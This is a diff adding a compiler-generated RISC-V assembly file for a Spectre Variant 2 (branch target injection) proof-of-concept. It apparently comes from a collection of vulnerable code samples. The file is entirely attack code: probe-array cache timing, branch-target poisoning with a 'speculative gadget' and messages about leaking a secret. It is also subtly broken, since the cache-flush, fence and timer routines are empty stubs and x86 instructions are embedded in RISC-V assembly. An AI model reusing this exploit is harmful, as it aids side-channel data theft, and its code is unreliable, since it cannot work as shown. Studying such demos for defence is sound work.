@@ -1,0 +1,458 @@
+	.file	"spectre_2.c"
+	.option nopic
+	.attribute arch, "rv64i2p1_m2p0_a2p1_f2p2_d2p2_c2p0_zicsr2p0_zifencei2p0_zmmul1p0_zaamo1p0_zalrsc1p0_zca1p0_zcd1p0"
+	.attribute unaligned_access, 0
+	.attribute stack_align, 16
+	.text
+	.align	1
+	.type	_mm_clflush, @function
+_mm_clflush:
+	addi	sp,sp,-32
+	sd	ra,24(sp)
+	sd	s0,16(sp)
+	addi	s0,sp,32
+	sd	a0,-24(s0)
+	nop
+	ld	ra,24(sp)
+	ld	s0,16(sp)
+	addi	sp,sp,32
+	jr	ra
+	.size	_mm_clflush, .-_mm_clflush
+	.align	1
+	.type	_mm_mfence, @function
+_mm_mfence:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+	sd	s0,0(sp)
+	addi	s0,sp,16
+	nop
+	ld	ra,8(sp)
+	ld	s0,0(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	_mm_mfence, .-_mm_mfence
+	.align	1
+	.type	_mm_lfence, @function
+_mm_lfence:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+	sd	s0,0(sp)
+	addi	s0,sp,16
+	nop
+	ld	ra,8(sp)
+	ld	s0,0(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	_mm_lfence, .-_mm_lfence
+	.align	1
+	.type	__rdtsc, @function
+__rdtsc:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+	sd	s0,0(sp)
+	addi	s0,sp,16
+	li	a5,0
+	mv	a0,a5
+	ld	ra,8(sp)
+	ld	s0,0(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	__rdtsc, .-__rdtsc
+	.globl	probe_array
+	.bss
+	.align	3
+	.type	probe_array, @object
+	.size	probe_array, 16384
+probe_array:
+	.zero	16384
+	.text
+	.align	1
+	.globl	flush_probe_array
+	.type	flush_probe_array, @function
+flush_probe_array:
+	addi	sp,sp,-32
+	sd	ra,24(sp)
+	sd	s0,16(sp)
+	addi	s0,sp,32
+	sw	zero,-20(s0)
+	j	.L7
+.L8:
+	lw	a5,-20(s0)
+	slliw	a5,a5,6
+	sext.w	a4,a5
+	lui	a5,%hi(probe_array)
+	addi	a5,a5,%lo(probe_array)
+	add	a5,a4,a5
+	mv	a0,a5
+	call	_mm_clflush
+	lw	a5,-20(s0)
+	addiw	a5,a5,1
+	sw	a5,-20(s0)
+.L7:
+	lw	a5,-20(s0)
+	sext.w	a4,a5
+	li	a5,255
+	ble	a4,a5,.L8
+	call	_mm_mfence
+	nop
+	ld	ra,24(sp)
+	ld	s0,16(sp)
+	addi	sp,sp,32
+	jr	ra
+	.size	flush_probe_array, .-flush_probe_array
+	.align	1
+	.type	rdtsc, @function
+rdtsc:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+	sd	s0,0(sp)
+	addi	s0,sp,16
+	call	__rdtsc
+	mv	a5,a0
+	mv	a0,a5
+	ld	ra,8(sp)
+	ld	s0,0(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	rdtsc, .-rdtsc
+	.align	1
+	.globl	measure_access_time
+	.type	measure_access_time, @function
+measure_access_time:
+	addi	sp,sp,-64
+	sd	ra,56(sp)
+	sd	s0,48(sp)
+	addi	s0,sp,64
+	sd	a0,-56(s0)
+	call	rdtsc
+	sd	a0,-24(s0)
+	ld	a5,-56(s0)
+	lbu	a5,0(a5)
+	sb	a5,-33(s0)
+	call	_mm_mfence
+	call	rdtsc
+	sd	a0,-32(s0)
+	ld	a4,-32(s0)
+	ld	a5,-24(s0)
+	sub	a5,a4,a5
+	mv	a0,a5
+	ld	ra,56(sp)
+	ld	s0,48(sp)
+	addi	sp,sp,64
+	jr	ra
+	.size	measure_access_time, .-measure_access_time
+	.align	1
+	.globl	benign_target
+	.type	benign_target, @function
+benign_target:
+	addi	sp,sp,-16
+	sd	ra,8(sp)
+	sd	s0,0(sp)
+	addi	s0,sp,16
+	nop
+	ld	ra,8(sp)
+	ld	s0,0(sp)
+	addi	sp,sp,16
+	jr	ra
+	.size	benign_target, .-benign_target
+	.align	1
+	.globl	common_init
+	.type	common_init, @function
+common_init:
+	addi	sp,sp,-32
+	sd	ra,24(sp)
+	sd	s0,16(sp)
+	addi	s0,sp,32
+	li	a2,16384
+	li	a1,0
+	lui	a5,%hi(probe_array)
+	addi	a0,a5,%lo(probe_array)
+	call	memset
+	sw	zero,-20(s0)
+	j	.L15
+.L16:
+	lui	a5,%hi(probe_array)
+	addi	a4,a5,%lo(probe_array)
+	lw	a5,-20(s0)
+	add	a5,a4,a5
+	li	a4,1
+	sb	a4,0(a5)
+	lw	a5,-20(s0)
+	addiw	a5,a5,64
+	sw	a5,-20(s0)
+.L15:
+	lw	a5,-20(s0)
+	sext.w	a4,a5
+	li	a5,16384
+	blt	a4,a5,.L16
+	call	_mm_mfence
+	call	flush_probe_array
+	call	_mm_mfence
+	nop
+	ld	ra,24(sp)
+	ld	s0,16(sp)
+	addi	sp,sp,32
+	jr	ra
+	.size	common_init, .-common_init
+	.section	.rodata
+	.align	3
+.LC0:
+	.string	"Measuring cache timings...\n"
+	.align	3
+.LC1:
+	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
+	.align	3
+.LC2:
+	.string	"SUCCESS! Leaked the actual %s.\n"
+	.align	3
+.LC3:
+	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
+	.align	3
+.LC4:
+	.string	"No %s leaked or could not detect leakage.\n"
+	.text
+	.align	1
+	.globl	perform_measurement
+	.type	perform_measurement, @function
+perform_measurement:
+	addi	sp,sp,-80
+	sd	ra,72(sp)
+	sd	s0,64(sp)
+	addi	s0,sp,80
+	mv	a5,a0
+	sd	a1,-80(s0)
+	sb	a5,-65(s0)
+	lui	a5,%hi(.LC0)
+	addi	a0,a5,%lo(.LC0)
+	call	printf
+	li	a5,-1
+	sw	a5,-20(s0)
+	li	a5,-1
+	sd	a5,-32(s0)
+	li	a5,50
+	sw	a5,-40(s0)
+	sw	zero,-36(s0)
+	j	.L18
+.L21:
+	lw	a5,-36(s0)
+	slliw	a5,a5,6
+	sext.w	a4,a5
+	lui	a5,%hi(probe_array)
+	addi	a5,a5,%lo(probe_array)
+	add	a5,a4,a5
+	sd	a5,-48(s0)
+	ld	a0,-48(s0)
+	call	measure_access_time
+	sd	a0,-56(s0)
+	lw	a5,-40(s0)
+	ld	a4,-56(s0)
+	bge	a4,a5,.L19
+	ld	a4,-32(s0)
+	li	a5,-1
+	beq	a4,a5,.L20
+	ld	a4,-56(s0)
+	ld	a5,-32(s0)
+	bge	a4,a5,.L19
+.L20:
+	ld	a5,-56(s0)
+	sd	a5,-32(s0)
+	lw	a5,-36(s0)
+	sw	a5,-20(s0)
+.L19:
+	lw	a5,-36(s0)
+	addiw	a5,a5,1
+	sw	a5,-36(s0)
+.L18:
+	lw	a5,-36(s0)
+	sext.w	a4,a5
+	li	a5,255
+	ble	a4,a5,.L21
+	lw	a5,-20(s0)
+	sext.w	a4,a5
+	li	a5,-1
+	beq	a4,a5,.L22
+	lw	a5,-20(s0)
+	andi	a5,a5,0xff
+	sext.w	a5,a5
+	lw	a3,-20(s0)
+	ld	a4,-32(s0)
+	mv	a2,a5
+	ld	a1,-80(s0)
+	lui	a5,%hi(.LC1)
+	addi	a0,a5,%lo(.LC1)
+	call	printf
+	lbu	a5,-65(s0)
+	sext.w	a5,a5
+	lw	a4,-20(s0)
+	sext.w	a4,a4
+	bne	a4,a5,.L23
+	ld	a1,-80(s0)
+	lui	a5,%hi(.LC2)
+	addi	a0,a5,%lo(.LC2)
+	call	printf
+	li	a5,1
+	j	.L24
+.L23:
+	ld	a1,-80(s0)
+	lui	a5,%hi(.LC3)
+	addi	a0,a5,%lo(.LC3)
+	call	printf
+	li	a5,0
+	j	.L24
+.L22:
+	ld	a1,-80(s0)
+	lui	a5,%hi(.LC4)
+	addi	a0,a5,%lo(.LC4)
+	call	printf
+	li	a5,0
+.L24:
+	mv	a0,a5
+	ld	ra,72(sp)
+	ld	s0,64(sp)
+	addi	sp,sp,80
+	jr	ra
+	.size	perform_measurement, .-perform_measurement
+	.align	1
+	.globl	speculative_gadget_v2
+	.type	speculative_gadget_v2, @function
+speculative_gadget_v2:
+	addi	sp,sp,-32
+	sd	ra,24(sp)
+	sd	s0,16(sp)
+	addi	s0,sp,32
+	mv	a5,a0
+	sb	a5,-17(s0)
+	lbu	a5,-17(s0)
+	sext.w	a5,a5
+	slliw	a5,a5,6
+	sext.w	a5,a5
+	lui	a4,%hi(probe_array)
+	addi	a4,a4,%lo(probe_array)
+	add	a5,a4,a5
+	li	a4,1
+	sb	a4,0(a5)
+	nop
+	ld	ra,24(sp)
+	ld	s0,16(sp)
+	addi	sp,sp,32
+	jr	ra
+	.size	speculative_gadget_v2, .-speculative_gadget_v2
+	.section	.rodata
+	.align	3
+.LC5:
+	.string	"Architectural execution reached benign target with value %d.\n"
+	.text
+	.align	1
+	.globl	architectural_target_v2
+	.type	architectural_target_v2, @function
+architectural_target_v2:
+	addi	sp,sp,-32
+	sd	ra,24(sp)
+	sd	s0,16(sp)
+	addi	s0,sp,32
+	mv	a5,a0
+	sb	a5,-17(s0)
+	lbu	a5,-17(s0)
+	sext.w	a5,a5
+	mv	a1,a5
+	lui	a5,%hi(.LC5)
+	addi	a0,a5,%lo(.LC5)
+	call	printf
+	nop
+	ld	ra,24(sp)
+	ld	s0,16(sp)
+	addi	sp,sp,32
+	jr	ra
+	.size	architectural_target_v2, .-architectural_target_v2
+	.section	.rodata
+	.align	3
+.LC6:
+	.string	"\n--- Running Spectre Variant 2 (Branch Target Injection) Demo ---\n"
+	.align	3
+.LC7:
+	.string	"Poisoning BTB with speculative gadget address...\n"
+	.align	3
+.LC8:
+	.string	"Triggering victim indirect call with architectural target...\n"
+	.align	3
+.LC9:
+	.string	"Spectre V2 secret"
+	.align	3
+.LC10:
+	.string	"Actual secret data: %c\n"
+	.text
+	.align	1
+	.globl	main_spectre_v2
+	.type	main_spectre_v2, @function
+main_spectre_v2:
+	addi	sp,sp,-48
+	sd	ra,40(sp)
+	sd	s0,32(sp)
+	addi	s0,sp,48
+	call	common_init
+	lui	a5,%hi(.LC6)
+	addi	a0,a5,%lo(.LC6)
+	call	printf
+	li	a5,84
+	sb	a5,-21(s0)
+	lui	a5,%hi(.LC7)
+	addi	a0,a5,%lo(.LC7)
+	call	printf
+	lui	a5,%hi(speculative_gadget_v2)
+	addi	a5,a5,%lo(speculative_gadget_v2)
+	sd	a5,-32(s0)
+	sw	zero,-20(s0)
+	j	.L28
+.L29:
+	ld	a5,-32(s0)
+ #APP
+# 49 "c_vulns/c_code/spectre_2.c" 1
+	callq *a5
+	mfence
+	lfence
+	
+# 0 "" 2
+ #NO_APP
+	lw	a5,-20(s0)
+	addiw	a5,a5,1
+	sw	a5,-20(s0)
+.L28:
+	lw	a5,-20(s0)
+	sext.w	a4,a5
+	li	a5,4096
+	addi	a5,a5,903
+	ble	a4,a5,.L29
+	call	_mm_mfence
+	call	flush_probe_array
+	call	_mm_lfence
+	lui	a5,%hi(.LC8)
+	addi	a0,a5,%lo(.LC8)
+	call	printf
+	lui	a5,%hi(architectural_target_v2)
+	addi	a5,a5,%lo(architectural_target_v2)
+	sd	a5,-40(s0)
+	lbu	a4,-21(s0)
+	ld	a5,-40(s0)
+	mv	a0,a4
+	jalr	a5
+	call	_mm_lfence
+	lbu	a4,-21(s0)
+	lui	a5,%hi(.LC9)
+	addi	a1,a5,%lo(.LC9)
+	mv	a0,a4
+	call	perform_measurement
+	lbu	a5,-21(s0)
+	sext.w	a5,a5
+	mv	a1,a5
+	lui	a5,%hi(.LC10)
+	addi	a0,a5,%lo(.LC10)
+	call	printf
+	li	a5,0
+	mv	a0,a5
+	ld	ra,40(sp)
+	ld	s0,32(sp)
+	addi	sp,sp,48
+	jr	ra
+	.size	main_spectre_v2, .-main_spectre_v2
+	.ident	"GCC: (GNU) 16.1.0"
+	.section	.note.GNU-stack,"",@progbits
